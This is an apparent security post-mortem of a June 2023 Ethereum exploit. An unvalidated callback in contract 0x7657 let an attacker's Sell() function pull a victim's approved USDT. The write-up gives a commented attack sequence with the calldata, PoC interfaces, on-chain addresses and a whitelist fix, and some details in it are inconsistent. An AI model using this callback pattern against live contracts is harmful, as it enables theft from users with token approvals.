# Contract 0x7657 Exploit — Arbitrary transferFrom via Malicious Sell() Callback

## Metadata
| Field | Value |
|---|---|
| Date | 2023-06 |
| Project | Unverified Contract 0x7657 |
| Chain | Ethereum |
| Loss | ~$1,300 |
| Attacker | 0x015d0b51d0a65ad11cf4425de2ec86a7b320db3f |
| Attack Contract | 0xfe2011dad32ad6dfd128e55490c0fd999f3d2221 |
| Attack TX | Address unconfirmed |
| Vulnerable Contract | 0x76577603f99eae8320f70b410a350a83D744CB77 |
| Block | 17,511,177 |
| CWE | CWE-284 (Improper Access Control — no caller check before transferFrom) |
| Vulnerability Type | Unvalidated Caller Triggers Victim transferFrom via Sell() Callback |

## Summary
The vulnerable contract exposed a function (selector `0x0a8fe064`) that accepted an arbitrary caller address, victim address, and amount — then called the caller's `Sell()` function. The attacker deployed a contract whose `Sell()` invoked `transferFrom(victim, attacker, amount)` on USDT, draining the victim's pre-approved USDT balance.

## Vulnerability Details
- **CWE-284**: The vulnerable contract's selector `0x0a8fe064` accepted `(address caller, address victim, uint256 amount)` and called `caller.Sell(victim, amount)` without verifying that `caller` was a legitimate swap contract. This allowed the attacker to pass their own contract as `caller`, whose `Sell()` called `USDT.transferFrom(victim, attacker, victim_balance)`.

### On-Chain Original Code

Source: Bytecode Decompiled

```solidity
// File: Contract0x7657_decompiled.sol
contract Contract0x7657 {  // ❌

    // Unknown selector: 0x0a8fe064
    // function unknown_0a8fe064() external {}

    // Unknown selector: 0x20d80081
    // function unknown_20d80081() external {}

    // Selector: 0x24d7806c
    function isAdmin(address account) external view {}  // ❌

    // Selector: 0x2f54bf6e
    function isOwner(address account) external view {}  // ❌

    // Unknown selector: 0x310bc8b3
    // function unknown_310bc8b3() external {}

    // Unknown selector: 0x33635413
    // function unknown_33635413() external {}

    // Selector: 0x3aaa36e6
    function Fees() external {}

    // Unknown selector: 0x53cf04fb
    // function unknown_53cf04fb() external {}

    // Selector: 0x595b504b
    function MaxRatio() external {}

    // Unknown selector: 0x61cacff3
    // function unknown_61cacff3() external {}

    // Unknown selector: 0x69bd3ca9
    // function unknown_69bd3ca9() external {}

    // Selector: 0x70480275
    function addAdmin(address account) external {}  // ❌

    // Unknown selector: 0x7abc86f8
    // function unknown_7abc86f8() external {}

    // Unknown selector: 0x84e3b7f8
    // function unknown_84e3b7f8() external {}

    // Selector: 0x8bad0c0a
    function renounceAdmin() external {}

    // Selector: 0x9e4a8c9c
    function PoolState() external {}

    // Unknown selector: 0xa05b1923
    // function unknown_a05b1923() external {}

    // Unknown selector: 0xa178bffd
    // function unknown_a178bffd() external {}

    // Unknown selector: 0xb9e53a43
    // function unknown_b9e53a43() external {}

    // Selector: 0xba9a7a56
    function MINIMUM_LIQUIDITY() external {}


// ...

    function isAdmin(address account) external view {}  // ❌

// ...

    function isOwner(address account) external view {}  // ❌

// ...

    function addAdmin(address account) external {}  // ❌
```

## Attack Flow (from testExploit())
```solidity
// Attacker contract implements Sell(address victim, uint256 amount):
// → USDT.transferFrom(victim, attacker, victim.balance)
//   (returns false — but vulnerable contract ignores return value)

// 1. IDPPAdvanced.flashLoan(USDT, 0, ...)  // optional flash for fees
// 2. vulnerableContract.call(
//       abi.encodeWithSelector(0x0a8fe064,
//           address(attackerContract),   // caller = attacker's contract
//           address(victim),             // victim with USDT approval
//           USDT.balanceOf(victim)       // full victim balance
//       )
//    )
// 3. → vulnerableContract calls attackerContract.Sell(victim, amount)
// 4. → attackerContract.Sell(): USDT.transferFrom(victim, attacker, amount)
// 5. Victim's 1,300 USDT drained
```

## Interfaces from PoC
```solidity
interface IVulnerable {
    // Selector 0x0a8fe064:
    function execute(address caller, address victim, uint256 amount) external;
}

interface IDPPAdvanced {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IUSDTinterface {
    function transfer(address to, uint256 value) external;
    function approve(address spender, uint256 value) external;
    function transferFrom(address from, address to, uint256 value) external;
    function balanceOf(address who) external view returns (uint256);
}
```

## Key Addresses
| Label | Address |
|---|---|
| Vulnerable Contract | 0x76577603f99eae8320f70b410a350a83D744CB77 |
| Attacker | 0x015d0b51d0a65ad11cf4425de2ec86a7b320db3f |
| Attack Contract | 0xfe2011dad32ad6dfd128e55490c0fd999f3d2221 |
| Victim | 0x637b935CbA030Aeb876eae07Aa7FF637166de4D6 |
| USDT | 0xdAC17F958D2ee523a2206206994597C13D831ec7 |

## Root Cause
The vulnerable contract called back to an arbitrary caller-supplied address without any whitelist or signature check. This allowed the attacker to inject a malicious callback that executed `transferFrom` on the victim's behalf.

## Fix
```solidity
// Whitelist approved swap contracts; never call back to arbitrary addresses:
mapping(address => bool) public approvedSwapContracts;

function execute(address swapContract, address user, uint256 amount) external {
    require(approvedSwapContracts[swapContract], "Unapproved swap contract");
    ISwap(swapContract).Sell(user, amount);
}
```

## References
- Ethereum block 17,511,177
- Victim: 0x637b935CbA030Aeb876eae07Aa7FF637166de4D6